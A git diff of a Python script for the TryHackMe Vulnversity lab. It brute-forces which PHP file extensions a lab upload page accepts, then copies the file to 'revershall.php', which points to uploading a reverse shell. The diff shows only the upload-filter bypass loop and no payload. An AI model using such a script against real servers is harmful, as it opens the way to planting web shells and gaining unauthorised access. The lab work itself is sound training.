@@ -1,4 +1,7 @@
-#!/usr/bin/env python
+#!/usr/bin/python3
+
+
+ 
 '''
 https://www.youtube.com/watch?v=hvYWCegfEZs&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=687s
 https://github.com/LegendSpam/VulnVersity/blob/main/ape.py
@@ -6,7 +9,10 @@ https://github.com/LegendSpam/VulnVersity/blob/main/ape.py
 import requests
 import os
 
-ip = "10.10.71.205"    # Get The ip from https://tryhackme.com/room/vulnversity
+
+
+print("start ape,py\n===============\n")
+ip = "10.10.121.171"    # Get The ip from https://tryhackme.com/room/vulnversity
 url = f"http://{ip}:3333/internal/index.php"# This is the upload page 
  
 
@@ -20,19 +26,28 @@ extensions = [
 ".phtml",
 ]
 
-for ext in extensions:
+# find which extension is not allowed . The file extension will be change in the next loop
+for ext in extensions:  # Chose a new extension fron the 'extensions' list
     new_filename = filename + ext
-    #print( new_filename)
+    os.rename(old_filename, new_filename)
+    print( new_filename)
     files = {"file": open(new_filename, "rb")}
     r = requests.post(url, files=files)
-
+    # r = html of the page
     if "Extension not allowed" in r.text:
        print(f"{ext} not allowed")
     else:
        print(f"{ext} seems to be allowed ?? ")
  
     old_filename = new_filename
+   
+os.system(f"cp {old_filename} revershall.php")
+os.system("ls")    
+  
 # https://youtu.be/hvYWCegfEZs?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=922
+
+
+
 ''' ------------- Source code of : ip :3333/internal/index.php  ---------
 <html>
 <head>
